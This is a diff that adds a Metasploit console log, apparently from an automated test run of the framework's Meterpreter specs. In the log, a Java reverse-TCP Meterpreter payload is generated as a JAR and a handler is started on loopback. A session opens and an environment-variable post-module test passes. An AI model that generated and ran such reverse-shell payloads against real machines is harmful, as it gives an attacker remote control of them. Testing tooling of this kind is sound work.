@@ -1,0 +1,22 @@
+use java/meterpreter/reverse_tcp
+Stopping all jobs...
+msf6 post(test/file) > generate -o D:/a/_temp/meterpreter-spec-rb-java-meterpreter-reverse-tcp20220203-1876-3nc8ds.jar -f jar AutoVerifySessionTimeout=10 spawn=0 lport=6016 lhost=127.0.0.1
+msf6 payload(java/meterpreter/reverse_tcp) > [*] Writing 5265 bytes to D:/a/_temp/meterpreter-spec-rb-java-meterpreter-reverse-tcp20220203-1876-3nc8ds.jar...
+msf6 payload(java/meterpreter/reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 15
+msf6 payload(java/meterpreter/reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6016 
+[*] Sending stage (58075 bytes) to 127.0.0.1
+[*] Meterpreter session 16 opened (127.0.0.1:6016 -> 127.0.0.1:50074 ) at 2022-02-03 22:54:18 +0000
+use test/get_env
+msf6 post(test/get_env) > run session=16 AddEntropy=true Verbose=true
+[*] Running against session 16
+[*] Session type is meterpreter and platform is windows
+[+] should return windows path
+[+] should handle % signs
+[+] should return multiple envs
+[*] Testing complete in 0.0367512
+[*] Passed: 3; Failed: 0
+[*] Post module execution completed
+msf6 post(test/get_env) > 
